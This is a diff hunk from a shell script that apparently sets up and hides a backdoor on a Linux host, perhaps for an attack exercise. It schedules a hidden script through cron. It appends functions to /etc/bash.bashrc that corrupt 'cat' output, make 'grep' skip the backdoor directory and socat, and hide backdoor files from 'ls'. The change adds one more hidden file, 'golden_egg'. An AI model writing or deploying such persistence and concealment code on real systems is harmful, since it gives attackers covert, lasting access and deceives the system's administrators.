@@ -63,7 +63,7 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 # Fun stuff with commands! ;)
 echo 'cat() { command cat "$@" | awk "NR % 2 == 0"; }' >> /etc/bash.bashrc
 echo 'grep() { command grep --exclude-dir=.nope --exclude="*socat" "$@"; }' >> /etc/bash.bashrc
-echo 'ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$"; }' >> /etc/bash.bashrc
+echo 'ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$|golden_egg$"; }' >> /etc/bash.bashrc
 
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
